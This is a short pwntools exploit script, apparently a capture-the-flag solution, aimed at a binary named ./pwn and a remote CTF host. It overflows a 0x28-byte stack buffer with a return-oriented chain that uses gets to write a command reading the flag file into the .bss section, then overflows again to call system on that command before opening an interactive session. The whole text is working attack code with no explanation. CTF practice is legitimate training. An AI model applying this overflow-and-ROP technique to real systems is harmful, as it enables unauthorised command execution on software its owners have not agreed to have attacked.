from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./pwn')
    elf = ELF('./pwn')
else:
    p = remote('pwn.challenge.ctf.show', 28105)
    elf = ELF('./pwn')
    pause()
main_addr=0x00000000004005F7
pop_rpi=0x00000000004006d3
bss_stage=elf.bss()+0x20
gets_plt=elf.plt['gets']
system_plt=elf.plt['system']
system=0x0000000000400658
payload=b'a'*0x28+p64(pop_rpi)+p64(bss_stage)+p64(gets_plt)+p64(main_addr)
p.sendline(payload)
p.sendline(b'base64<flag\x00')
p.recv()
payload2=b'a'*0x28+p64(pop_rpi)+p64(bss_stage)+p64(system)
p.sendline(payload2)
p.interactive()
